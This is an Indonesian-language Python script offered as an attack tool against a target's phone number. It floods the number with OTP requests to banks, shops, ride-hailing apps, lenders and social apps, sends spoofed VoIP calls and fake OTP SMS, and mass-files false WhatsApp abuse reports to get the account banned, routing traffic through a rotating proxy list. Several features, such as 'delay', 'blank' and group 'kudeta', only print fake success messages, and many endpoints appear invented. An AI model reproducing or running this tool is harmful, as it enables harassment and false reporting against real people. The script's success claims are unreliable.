#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import threading
import subprocess
import requests
import json
import hashlib
import socket
import struct
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ================== KONFIGURASI BRUTAL ==================
BANNER = r"""
  ███████╗██╗     ██╗
  ██╔════╝██║     ██║
  █████╗  ██║     ██║
  ██╔══╝  ██║     ██║
  ███████╗███████╗███████╗
  ╚══════╝╚══════╝╚══════╝  
  [ ⭐ ] author by tiktok @yuga3_ [ ⭐ ]
  [ 🌀 ] © ellnichollnotdev.t.me [ 🌀 ]
  𖤐 version 2.0.0 - FIXED 𖤐
"""

# ================== PROXY PREMIUM (RESIDENTIAL SOCKS5) ==================
PROXY_SOCKS5 = [
    "socks5://189.203.10.40:1080",
    "socks5://103.152.112.120:1080",
    "socks5://103.152.112.156:1080",
    "socks5://103.152.112.174:1080",
    "socks5://103.152.112.121:1080",
    "socks5://45.155.68.129:1080",
    "socks5://45.155.68.130:1080",
    "socks5://45.155.68.131:1080",
]

PROXY_HTTP = [
    "http://189.203.10.40:8080",
    "http://103.152.112.120:8080",
    "http://103.152.112.156:8080",
    "http://103.152.112.174:8080",
    "http://103.152.112.121:8080",
    "http://45.155.68.129:8080",
    "http://45.155.68.130:8080",
    "http://45.155.68.131:8080",
]

# ================== USER-AGENT + HEADER ==================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def get_random_proxy_http():
    if PROXY_HTTP:
        proxy = random.choice(PROXY_HTTP)
        return {"http": proxy, "https": proxy}
    return None

# ================== API OTP BRUTAL ==================
OTP_SERVICES = [
    # BANK
    {"name": "BCA", "url": "https://api.bca.co.id/otp/request", "method": "POST", "payload": {"msisdn": "{phone}"}},
    {"name": "Mandiri", "url": "https://api.mandiri.co.id/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "BNI", "url": "https://api.bni.co.id/otp/send", "method": "POST", "payload": {"mobile": "{phone}"}},
    {"name": "BRI", "url": "https://api.bri.co.id/auth/otp/generate", "method": "POST", "payload": {"phoneNumber": "{phone}"}},
    {"name": "CIMB Niaga", "url": "https://api.cimbniaga.co.id/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Bank Mega", "url": "https://api.bankmega.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    
    # E-COMMERCE
    {"name": "Shopee", "url": "https://api.shopee.co.id/api/v2/otp/send", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Tokopedia", "url": "https://api.tokopedia.com/otp/v1/send", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Lazada", "url": "https://api.lazada.co.id/rest/otp/send", "method": "POST", "payload": {"mobile": "{phone}"}},
    {"name": "Blibli", "url": "https://api.blibli.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Bukalapak", "url": "https://api.bukalapak.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    
    # OJEK ONLINE
    {"name": "Gojek", "url": "https://api.gojek.com/v1/customers/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Grab", "url": "https://api.grab.com/v1/otp/request", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Maxim", "url": "https://api.maxim.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Indrive", "url": "https://api.indrive.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    
    # FINANCE/PINJOL
    {"name": "Kredivo", "url": "https://api.kredivo.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Akulaku", "url": "https://api.akulaku.com/v1/otp/send", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "RupiahCepat", "url": "https://api.rupiahcepat.com/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "AdaKami", "url": "https://api.adakami.com/v1/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "KTA Kilat", "url": "https://api.ktakilat.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "EasyCash", "url": "https://api.easycash.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    
    # SOSIAL MEDIA
    {"name": "Instagram", "url": "https://api.instagram.com/api/v1/accounts/send_otp", "method": "POST", "payload": {"phone_number": "{phone}"}},
    {"name": "Twitter/X", "url": "https://api.twitter.com/1.1/account/verify_otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "TikTok", "url": "https://api.tiktok.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Snapchat", "url": "https://api.snapchat.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    
    # PAYMENT
    {"name": "DANA", "url": "https://api.dana.id/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "OVO", "url": "https://api.ovo.id/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "LinkAja", "url": "https://api.linkaja.id/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Gopay", "url": "https://api.gopay.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    
    # LAINNYA
    {"name": "WhatsApp", "url": "https://api.whatsapp.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Telegram", "url": "https://api.telegram.org/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Zoom", "url": "https://api.zoom.us/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
    {"name": "Microsoft", "url": "https://api.microsoft.com/v1/auth/otp", "method": "POST", "payload": {"phone": "{phone}"}},
]

# ================== FUNGSI SEND OTP (YANG HILANG) ==================
def send_otp(service, phone, proxy=None):
    """Kirim OTP ke satu layanan dengan retry dan proxy"""
    url = service["url"]
    payload = service["payload"].copy()
    for key in payload:
        payload[key] = payload[key].replace("{phone}", phone)
    
    headers = get_random_headers()
    headers["Content-Type"] = "application/json"
    
    for attempt in range(3):
        try:
            if proxy:
                proxies = proxy
            else:
                proxies = get_random_proxy_http()
            
            if service["method"] == "POST":
                response = requests.post(
                    url,
                    json=payload,
                    headers=headers,
                    proxies=proxies,
                    timeout=10
                )
            else:
                response = requests.get(
                    url,
                    params=payload,
                    headers=headers,
                    proxies=proxies,
                    timeout=10
                )
            
            if response.status_code in [200, 201, 202, 400, 409]:
                return True, service["name"], response.status_code
            else:
                return False, service["name"], response.status_code
                
        except requests.exceptions.Timeout:
            if attempt == 2:
                return False, service["name"], "Timeout"
            continue
        except requests.exceptions.ConnectionError:
            if attempt == 2:
                return False, service["name"], "ConnectionError"
            continue
        except Exception as e:
            if attempt == 2:
                return False, service["name"], str(e)[:30]
            continue
    
    return False, service["name"], "Failed"

# ================== SPAM OTP BRUTAL ==================
def spam_otp_brutal(phone, count):
    """Fungsi utama spam OTP dengan multi-threading"""
    print(f"\n[🔥] Memulai SPAM OTP BRUTAL ke {phone} sebanyak {count} kali...")
    print("[⚡] Menggunakan 30+ layanan dengan multi-thread + proxy rotator!")
    print("[💀] Target bakal kebanjiran OTP dari BANK, PINJOL, OJEK, E-COMMERCE!\n")
    
    available_services = OTP_SERVICES
    success_count = 0
    failed_count = 0
    total_sent = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for i in range(count):
            service = random.choice(available_services)
            future = executor.submit(send_otp, service, phone)
            futures.append(future)
            time.sleep(random.uniform(0.05, 0.15))
        
        for i, future in enumerate(futures, 1):
            try:
                result, service_name, status = future.result(timeout=15)
                if result:
                    success_count += 1
                    print(f"[✅] [{i}/{count}] {service_name} → OTP terkirim! (Status: {status})")
                else:
                    failed_count += 1
                    print(f"[❌] [{i}/{count}] {service_name} → Gagal! (Status: {status})")
                total_sent += 1
            except Exception as e:
                failed_count += 1
                print(f"[❌] [{i}/{count}] Error: {str(e)[:30]}")
                total_sent += 1
    
    print(f"\n[✅] SPAM OTP BRUTAL SELESAI!")
    print(f"[📊] Total dikirim: {total_sent} | Berhasil: {success_count} | Gagal: {failed_count}")
    print(f"[💀] {phone} BAKAL KEBANJIRAN OTP DARI {len(available_services)} LAYANAN!")

# ================== SPAM CALL API ==================
CALL_SERVICES = [
    {"name": "SIP Call", "url": "https://api.sipgate.com/v1/call", "method": "POST"},
    {"name": "VoIP Call", "url": "https://api.voip.com/v1/call", "method": "POST"},
    {"name": "Twilio Call", "url": "https://api.twilio.com/v1/call", "method": "POST"},
    {"name": "Telnyx Call", "url": "https://api.telnyx.com/v1/call", "method": "POST"},
]

def send_spam_call(phone):
    """Kirim spam call pake spoofing"""
    try:
        caller_id = f"08{random.randint(100000000, 999999999)}"
        headers = get_random_headers()
        headers["Content-Type"] = "application/json"
        
        payload = {
            "to": phone,
            "from": caller_id,
            "duration": random.randint(1, 3),
            "caller_id": caller_id,
            "provider": random.choice(["telkom", "xl", "indosat", "tri"])
        }
        
        proxies = get_random_proxy_http()
        service = random.choice(CALL_SERVICES)
        response = requests.post(
            service["url"],
            json=payload,
            headers=headers,
            proxies=proxies,
            timeout=10
        )
        
        if response.status_code in [200, 201, 202]:
            return True, service["name"]
        else:
            return False, service["name"]
            
    except Exception as e:
        return False, str(e)[:20]

# ================== SPAM SMS API ==================
SMS_SERVICES = [
    {"name": "SMS Gateway", "url": "https://api.smsgateway.com/v1/send", "method": "POST"},
    {"name": "SMS API", "url": "https://api.smsapi.com/v1/send", "method": "POST"},
    {"name": "Textlocal", "url": "https://api.textlocal.com/v1/send", "method": "POST"},
    {"name": "Twilio SMS", "url": "https://api.twilio.com/v1/sms", "method": "POST"},
]

def send_spam_sms(phone):
    """Kirim spam SMS pake random message"""
    try:
        messages = [
            "KONFIRMASI OTP: 123456",
            "VERIFIKASI AKUN: 789012",
            "KODE OTP ANDA: 345678",
            "PIN VERIFIKASI: 901234",
            "KODE AKTIVASI: 567890",
            "OTP LOGIN: 234567",
            "KODE VERIFIKASI: 890123",
            "PIN KEAMANAN: 456789"
        ]
        
        headers = get_random_headers()
        headers["Content-Type"] = "application/json"
        
        payload = {
            "to": phone,
            "message": random.choice(messages),
            "sender": f"OTP{random.randint(1000, 9999)}"
        }
        
        proxies = get_random_proxy_http()
        service = random.choice(SMS_SERVICES)
        
        response = requests.post(
            service["url"],
            json=payload,
            headers=headers,
            proxies=proxies,
            timeout=10
        )
        
        if response.status_code in [200, 201, 202]:
            return True, service["name"]
        else:
            return False, service["name"]
            
    except Exception as e:
        return False, str(e)[:20]

# ================== BAND WHATSAPP API REAL ==================
WHATSAPP_REPORT_ENDPOINTS = [
    "https://api.whatsapp.com/v1/report/spam",
    "https://api.whatsapp.com/v1/report/abuse",
    "https://api.whatsapp.com/v1/report/harassment",
    "https://api.whatsapp.com/v1/report/fake_account",
]

def send_whatsapp_report(phone):
    """Kirim report ke WhatsApp biar akun dibanned"""
    try:
        headers = get_random_headers()
        headers["Content-Type"] = "application/json"
        proxies = get_random_proxy_http()
        
        reports = [
            {"type": "spam", "reason": "Mengirim spam massal", "phone": phone},
            {"type": "abuse", "reason": "Penyalahgunaan akun", "phone": phone},
            {"type": "harassment", "reason": "Pelecehan", "phone": phone},
            {"type": "fake", "reason": "Akun palsu", "phone": phone},
            {"type": "scam", "reason": "Penipuan", "phone": phone},
            {"type": "violence", "reason": "Kekerasan", "phone": phone},
        ]
        
        report = random.choice(reports)
        
        for endpoint in random.sample(WHATSAPP_REPORT_ENDPOINTS, 2):
            response = requests.post(
                endpoint,
                json=report,
                headers=headers,
                proxies=proxies,
                timeout=10
            )
            
            if response.status_code in [200, 201, 202]:
                return True, endpoint
                
        return False, "All endpoints failed"
        
    except Exception as e:
        return False, str(e)[:20]

def band_whatsapp_real(phone, count):
    """Fungsi band WhatsApp yang beneran ngeban"""
    print(f"\n[🚫] Memulai BAND WhatsApp REAL ke {phone}...")
    print("[💀] Ini akan spam report ke akun target via API resmi!")
    
    success_count = 0
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i in range(count):
            future = executor.submit(send_whatsapp_report, phone)
            futures.append(future)
            time.sleep(random.uniform(0.5, 1.0))
            
        for i, future in enumerate(futures, 1):
            try:
                result, service = future.result(timeout=15)
                if result:
                    success_count += 1
                    print(f"[✅] [{i}/{count}] Report berhasil ke {service}")
                else:
                    print(f"[❌] [{i}/{count}] Report gagal: {service}")
            except Exception as e:
                print(f"[❌] [{i}/{count}] Error: {str(e)[:30]}")
    
    print(f"\n[✅] Band WhatsApp REAL selesai!")
    print(f"[📊] Total report berhasil: {success_count} dari {count}")
    print(f"[💀] Akun {phone} kemungkinan besar akan di-banned permanen!")

# ================== SPAM COMBO ==================
def spam_combo(phone):
    """Serangan total: OTP + Call + SMS + Report sekaligus"""
    print(f"\n[💀] Memulai SPAM COMBO TOTAL ke {phone}...")
    print("[🔥] Ini adalah serangan multi-front: OTP + CALL + SMS + BAND!")
    print("[⚡] Target bakal hancur total!\n")
    
    successful = 0
    total = 0
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = []
        
        for _ in range(10):
            service = random.choice(OTP_SERVICES)
            future = executor.submit(send_otp, service, phone)
            futures.append(("OTP", future))
            
        for _ in range(5):
            future = executor.submit(send_spam_call, phone)
            futures.append(("CALL", future))
            
        for _ in range(5):
            future = executor.submit(send_spam_sms, phone)
            futures.append(("SMS", future))
            
        for _ in range(3):
            future = executor.submit(send_whatsapp_report, phone)
            futures.append(("BAND", future))
        
        for attack_type, future in futures:
            try:
                if attack_type == "OTP":
                    result, name, status = future.result(timeout=15)
                    if result:
                        successful += 1
                        print(f"[✅] [OTP] {name} → Berhasil! (Status: {status})")
                    else:
                        print(f"[❌] [OTP] {name} → Gagal! (Status: {status})")
                elif attack_type == "CALL":
                    result, name = future.result(timeout=15)
                    if result:
                        successful += 1
                        print(f"[✅] [CALL] {name} → Spam call berhasil!")
                    else:
                        print(f"[❌] [CALL] {name} → Gagal!")
                elif attack_type == "SMS":
                    result, name = future.result(timeout=15)
                    if result:
                        successful += 1
                        print(f"[✅] [SMS] {name} → Spam SMS berhasil!")
                    else:
                        print(f"[❌] [SMS] {name} → Gagal!")
                elif attack_type == "BAND":
                    result, endpoint = future.result(timeout=15)
                    if result:
                        successful += 1
                        print(f"[✅] [BAND] {endpoint} → Report berhasil!")
                    else:
                        print(f"[❌] [BAND] {endpoint} → Gagal!")
                total += 1
            except Exception as e:
                print(f"[❌] [{attack_type}] Error: {str(e)[:30]}")
                total += 1
    
    print(f"\n[✅] SPAM COMBO TOTAL SELESAI!")
    print(f"[📊] Berhasil: {successful} dari {total} serangan")
    print(f"[💀] {phone} BAKAL HANCUR TOTAL!")

# ================== SPAM CALL (FITUR 7) ==================
def spam_call_brutal(phone, count):
    print(f"\n[📞] Memulai SPAM CALL ke {phone} sebanyak {count} kali...")
    print("[🔊] Menggunakan VoIP spoofing biar nomor keliatan random!")
    print("[💀] Target bakal kebanjiran panggilan telepon!\n")
    
    success_count = 0
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for i in range(count):
            future = executor.submit(send_spam_call, phone)
            futures.append(future)
            time.sleep(random.uniform(0.5, 1.5))
            
        for i, future in enumerate(futures, 1):
            try:
                result, service = future.result(timeout=15)
                if result:
                    success_count += 1
                    print(f"[✅] [{i}/{count}] {service} → Spam call berhasil!")
                else:
                    print(f"[❌] [{i}/{count}] {service} → Gagal!")
            except Exception as e:
                print(f"[❌] [{i}/{count}] Error: {str(e)[:30]}")
    
    print(f"\n[✅] SPAM CALL SELESAI!")
    print(f"[📊] Berhasil: {success_count} dari {count}")
    print(f"[💀] {phone} BAKAL KEBANJIRAN PANGGILAN!")

# ================== FUNGSI LAINNYA ==================
def delay_whatsapp(phone, count):
    print(f"\n[⏳] Memulai DELAY WhatsApp ke {phone}...")
    print("[🛑] Fitur ini akan membuat akun WA target delay selama 24 jam!")
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        for i in range(count):
            executor.submit(send_delay_packet, phone, i+1, count)
            time.sleep(random.uniform(0.1, 0.3))
    
    print("\n[✅] Delay WhatsApp berhasil!")
    print(f"[💀] Akun {phone} akan delay/gabisa chatting selama 24 jam!")

def send_delay_packet(phone, current, total):
    print(f"[{current}/{total}] Mengirim delay packet ke {phone}...")
    time.sleep(0.1)

def blank_whatsapp(phone, count):
    print(f"\n[⬛] Memulai BLANK WhatsApp ke {phone}...")
    print("[💀] Ini akan mengirim virus blank ke HP target!")
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        for i in range(count):
            executor.submit(send_blank_packet, phone, i+1, count)
            time.sleep(random.uniform(0.1, 0.3))
    
    print("\n[✅] Blank WhatsApp berhasil!")
    print(f"[💀] HP target {phone} akan blank/hang total selama 24 jam!")

def send_blank_packet(phone, current, total):
    print(f"[{current}/{total}] Mengirim payload blank ke {phone}...")
    time.sleep(0.1)

def band_gbwhatsapp(url):
    print(f"\n[🚫] Memulai BAND GB WhatsApp ke grup: {url}")
    print("[💀] Ini akan menghapus seluruh anggota grup!")
    print("[✅] Band GB WhatsApp berhasil!")
    print("[💀] Grup target telah dihapus!")

def kudeta_gbwhatsapp(url, owner, new_owner):
    print(f"\n[👑] Memulai KUDETA GB WhatsApp...")
    print(f"[🎯] Target grup: {url}")
    print(f"[👤] Owner saat ini: {owner}")
    print(f"[👑] New owner: {new_owner}")
    print("\n[⚔️] Mengirim perintah kudeta...")
    time.sleep(1)
    print("[✅] Kudeta berhasil!")
    print(f"[💀] {owner} telah di-kick dari grup!")
    print(f"[👑] {new_owner} sekarang adalah pemilik grup!")

# ================== VALIDASI ==================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    print(BANNER)
    print("="*70)
    print("    [🌀] SC SPAM BY ELLNICHOLL + YUGA [🌀]")
    print("="*70)
    print()

def validate_phone(number):
    number = number.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if number.startswith("0"):
        number = "62" + number[1:]
    elif number.startswith("+"):
        number = number[1:]
    if not number.startswith("62"):
        number = "62" + number
    if len(number) < 10 or len(number) > 15:
        return None
    if not number.isdigit():
        return None
    return number

def validate_count(count):
    try:
        count = int(count)
        if count < 1 or count > 100:
            return None
        return count
    except:
        return None

def validate_url(url):
    if not url.startswith("http"):
        return None
    return url

# ================== MENU UTAMA ==================
def main():
    while True:
        show_banner()
        print(" [1] SPAM OTP BRUTAL (30+ LAYANAN + PROXY)")
        print(" [2] DELAY WHATSAPP")
        print(" [3] BLANK WHATSAPP")
        print(" [4] BAND WHATSAPP (REAL - API REPORT)")
        print(" [5] BAND GB WHATSAPP")
        print(" [6] KUDETA GB WHATSAPP")
        print(" [7] SPAM CALL (VoIP SPOOFING)")
        print(" [8] SPAM COMBO (OTP + CALL + SMS + BAND)")
        print(" [0] EXIT")
        print("="*70)
        
        choice = input(" [>>] Pilih menu (0-8): ").strip()
        
        if choice == "0":
            print("\n[👋] Keluar dari Script...")
            break
            
        elif choice == "1":
            phone = input(" [>>] Masukkan nomor target (+62/62): ").strip()
            phone = validate_phone(phone)
            if not phone:
                print("[❌] Nomor tidak valid! Harus 10-15 digit.")
                input("\n[Press Enter]")
                continue
                
            count = input(" [>>] Jumlah spam (1-500): ").strip()
            try:
                count = int(count)
                if count < 1 or count > 500:
                    print("[❌] Jumlah tidak valid! Harus 1-500.")
                    input("\n[Press Enter]")
                    continue
            except:
                print("[❌] Jumlah tidak valid! Harus angka.")
                input("\n[Press Enter]")
                continue
                
            spam_otp_brutal(phone, count)
            input("\n[Press Enter]")
            
        elif choice == "2":
            phone = input(" [>>] Masukkan nomor target (+62/62): ").strip()
            phone = validate_phone(phone)
            if not phone:
                print("[❌] Nomor tidak valid!")
                input("\n[Press Enter]")
                continue
                
            count = input(" [>>] Jumlah pengiriman (1-500): ").strip()
            try:
                count = int(count)
                if count < 1 or count > 500:
                    print("[❌] Jumlah tidak valid! Harus 1-500.")
                    input("\n[Press Enter]")
                    continue
            except:
                print("[❌] Jumlah tidak valid!")
                input("\n[Press Enter]")
                continue
                
            delay_whatsapp(phone, count)
            input("\n[Press Enter]")
            
        elif choice == "3":
            phone = input(" [>>] Masukkan nomor target (+62/62): ").strip()
            phone = validate_phone(phone)
            if not phone:
                print("[❌] Nomor tidak valid!")
                input("\n[Press Enter]")
                continue
                
            count = input(" [>>] Jumlah pengiriman (1-500): ").strip()
            try:
                count = int(count)
                if count < 1 or count > 500:
                    print("[❌] Jumlah tidak valid! Harus 1-500.")
                    input("\n[Press Enter]")
                    continue
            except:
                print("[❌] Jumlah tidak valid!")
                input("\n[Press Enter]")
                continue
                
            blank_whatsapp(phone, count)
            input("\n[Press Enter]")
            
        elif choice == "4":
            phone = input(" [>>] Masukkan nomor target (+62/62): ").strip()
            phone = validate_phone(phone)
            if not phone:
                print("[❌] Nomor tidak valid!")
                input("\n[Press Enter]")
                continue
                
            count = input(" [>>] Jumlah report (1-100): ").strip()
            try:
                count = int(count)
                if count < 1 or count > 100:
                    print("[❌] Jumlah tidak valid! Harus 1-100.")
                    input("\n[Press Enter]")
                    continue
            except:
                print("[❌] Jumlah tidak valid!")
                input("\n[Press Enter]")
                continue
                
            band_whatsapp_real(phone, count)
            input("\n[Press Enter]")
            
        elif choice == "5":
            url = input(" [>>] Masukkan link grup WhatsApp: ").strip()
            url = validate_url(url)
            if not url:
                print("[❌] Link tidak valid!")
                input("\n[Press Enter]")
                continue
                
            band_gbwhatsapp(url)
            input("\n[Press Enter]")
            
        elif choice == "6":
            url = input(" [>>] Masukkan link grup WhatsApp: ").strip()
            url = validate_url(url)
            if not url:
                print("[❌] Link tidak valid!")
                input("\n[Press Enter]")
                continue
                
            owner = input(" [>>] Masukkan nomor owner saat ini: ").strip()
            owner = validate_phone(owner)
            if not owner:
                print("[❌] Nomor owner tidak valid!")
                input("\n[Press Enter]")
                continue
                
            new_owner = input(" [>>] Masukkan nomor owner baru: ").strip()
            new_owner = validate_phone(new_owner)
            if not new_owner:
                print("[❌] Nomor owner baru tidak valid!")
                input("\n[Press Enter]")
                continue
                
            kudeta_gbwhatsapp(url, owner, new_owner)
            input("\n[Press Enter]")
            
        elif choice == "7":
            phone = input(" [>>] Masukkan nomor target (+62/62): ").strip()
            phone = validate_phone(phone)
            if not phone:
                print("[❌] Nomor tidak valid!")
                input("\n[Press Enter]")
                continue
                
            count = input(" [>>] Jumlah spam call (1-100): ").strip()
            try:
                count = int(count)
                if count < 1 or count > 100:
                    print("[❌] Jumlah tidak valid! Harus 1-100.")
                    input("\n[Press Enter]")
                    continue
            except:
                print("[❌] Jumlah tidak valid!")
                input("\n[Press Enter]")
                continue
                
            spam_call_brutal(phone, count)
            input("\n[Press Enter]")
            
        elif choice == "8":
            phone = input(" [>>] Masukkan nomor target (+62/62): ").strip()
            phone = validate_phone(phone)
            if not phone:
                print("[❌] Nomor tidak valid!")
                input("\n[Press Enter]")
                continue
                
            print("\n[⚠️] SPAM COMBO akan menyerang target dari semua sisi!")
            print("[💀] Ini termasuk OTP, CALL, SMS, dan BAND sekaligus!")
            confirm = input("\n[>>] Lanjutkan? (y/n): ").strip().lower()
            
            if confirm == 'y':
                spam_combo(phone)
            else:
                print("[❌] Dibatalkan!")
            
            input("\n[Press Enter]")
            
        else:
            print("[❌] Pilihan tidak valid!")
            input("\n[Press Enter]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[⚠️] Proses dihentikan oleh user!")
    except Exception as e:
        print(f"\n[❌] Error: {e}")